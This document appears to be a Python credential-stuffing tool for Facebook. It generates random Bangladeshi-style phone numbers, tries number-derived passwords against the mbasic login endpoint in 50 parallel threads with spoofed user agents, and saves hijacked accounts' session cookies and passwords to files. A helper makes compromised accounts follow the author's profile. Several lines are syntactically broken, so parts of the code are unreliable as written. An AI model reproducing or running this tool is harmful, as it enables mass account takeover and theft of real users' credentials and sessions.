#Welcome To TAH SIN WORLD Tools
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100001986429022', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('espeak -a 300 " SECURITY, Alated, FUCK, Your, system, warning,,"')
NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  FARHAN,  WORLD"')
os.system('xdg-open https://www.facebook.com/profile.php?id=100001986429022')
def banner():
	os.system("clear") 
logo = ("""


_________ _______  _                     
\__   __/(  ____ \( (    /|     |\     /|
   ) (   | (    \/|  \  ( |     ( \   / )
   | |   | (__    |   \ | | _____\ (_) / 
   | |   |  __)   | (\ \) |(_____)) _ (  
   | |   | (      | | \   |      / ( ) \ 
   | |   | (____/\| )  \  |     ( /   \ )
   )_(   (_______/|/    )_)     |/     \|
                                         

\033[1;36m═══════════════════════════════════════\033[1;0m 
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mOWONER     \x1b[1;97m● \033[38;5;46mTAH SIN
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mGuthub   \x1b[1;97m  ● \033[38;5;46mTahsin404
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46m[TOOL]     \x1b[1;97m● \x1b[1;97mV/1.4
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mTools type \x1b[1;97m● \033[38;5;46mFREE+RANDOM\x1b[38;5;196m┼\033[1;41m\033[1;97m\x1b[38;5;196m\033[47m\x1b[0m\x1b[38;5;196m┼
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
	print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mPLZ W8 BRO... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
#Mozilla/5.0 (Linux; Android 14; I2220 Build/UP1A.231005.007_IN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.133 Mobile Safari/537.36

ugen=[]
for farhan in range(15):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['8','9','10','11','12','13','14','15'])
    c='I2220 Build/UP1A.231005.007_IN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,126)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,190)
    h='Mobile Safari/537.36'
    ua=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(ua)
    
    print(ugen)
    
# APK CHECK
def TAHSIN():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}019,017,018,92302,92301,91778{x}')
    linex()
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Choose : ')
    os.system('clear')
    print(logo)
    print('\033[1;91m[\033[1;92m➤\033[1;91m]\033[1;97m 𝙴𝚇𝙰𝙼𝙿𝙻𝙴 𝙻𝙸𝙼𝙸𝚃  \033[1;91m➤ \033[1;32m2000➤5000➤10000➤15000➤50000')
    linex()
    limit = int(input('\033[1;91m[\033[1;92m➤\033[1;91m]\033[1;97m 𝙴𝙽𝚃𝙴𝚁 𝚈𝙾??𝚁 𝙲??𝙰𝙲𝙺 𝙻𝙸𝙼𝙸𝚃 \033[1;91m➤ \033[1;97m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    Mariya = []
    print("")
    for bilal in range(passx):
        aminew = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
        Mariya.append(aminew)
    with ThreadPool(max_workers=50) as amiAriyan:
        clear()
        tl = str(len(user))
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOTAL IDS: {xr}'+tl)
        print(f'{x} \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m THE FUCKING HAS BEEN STARTED')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        linex()
        for vaiya in user:
            pwx = [vaiya[1:]]
            uid = code+vaiya
            for Lol in Mariya:
                pwx.append(Lol)
                pwx.append(vaiya)
            amiAriyan.submit(rcrack,uid,pwx,tl)
    
    print('THE FUCKING PROCESS HAS BEEN FINISHED')
    print('OK IDS SAVED IN /TenX-OK😌?️.txt')
    print('Cp Ids Saved in /Tah-CP🤧.txt')
    linex()
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'method:' GET
    'scheme:' https
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'sb=7PzaZrd_KZby3Joipgg-w4tV; ps_l=1; ps_n=1; locale=en_GB; datr=CiXbZkXoDJz-Iht8Yee2X6Qu; wl_cbv=v2%3Bclient_version%3A2613%3Btimestamp%3A1725637898; vpd=v1%3B756x400x1.8000000715255737; m_pixel_ratio=1.8000000715255737; wd=400x445; fr=0I6UkjObUldhtlFhT.AWV-c6rnjz8YVYK-M30DbjaeZBo.Bm2vzt..AAA.0.0.Bm2yUa.AWW2r1E-eKo',
    'dpr': '1.8000000715255737',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"V2204"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m [TEN-X😺] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Tah-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;31m [TAHSIN-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/farzu-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}TENXK{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

TAHSIN()
